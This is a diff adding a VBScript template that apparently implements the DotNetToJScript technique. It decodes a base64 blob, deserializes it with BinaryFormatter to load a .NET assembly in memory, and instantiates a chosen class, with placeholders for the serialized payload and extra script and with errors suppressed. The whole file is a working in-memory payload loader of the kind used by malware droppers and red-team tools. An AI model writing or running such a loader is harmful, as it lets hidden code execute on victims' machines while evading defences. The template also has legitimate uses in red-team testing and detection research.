@@ -1,0 +1,33 @@
+Function Base64ToStream(b)
+  Dim enc, length, ba, transform, ms
+  Set enc = CreateObject("System.Text.ASCIIEncoding")
+  length = enc.GetByteCount_2(b)
+  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
+  Set ms = CreateObject("System.IO.MemoryStream")
+  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
+  ms.Position = 0
+  Set Base64ToStream = ms
+End Function
+
+Sub Run
+Dim s, entry_class
+s = %SERIALIZED%
+entry_class = "%CLASS%"
+
+Dim fmt, al, d, o
+Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+Set al = CreateObject("System.Collections.ArrayList")
+al.Add fmt.SurrogateSelector
+
+Set d = fmt.Deserialize_2(Base64ToStream(s))
+Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+%ADDEDSCRIPT%
+End Sub
+
+SetVersion
+On Error Resume Next
+Run
+If Err.Number <> 0 Then
+  Debug Err.Description
+  Err.Clear
+End If
